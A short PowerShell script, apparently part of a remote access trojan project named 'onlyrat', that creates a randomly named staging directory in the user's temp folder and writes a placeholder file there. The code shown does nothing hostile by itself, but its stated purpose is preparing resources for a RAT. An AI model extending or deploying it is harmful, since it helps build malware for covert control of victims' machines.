#builds resources for rat
#randome string for directories

function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
  }
  
## variables 
$wd = random_text
$path = "$env:temp/$wd"
echo $path

# goto temp , make working directory 
mkdir $path 
cd $path
echo "" > poc.txt 
cd D:\0\onlyrat\files
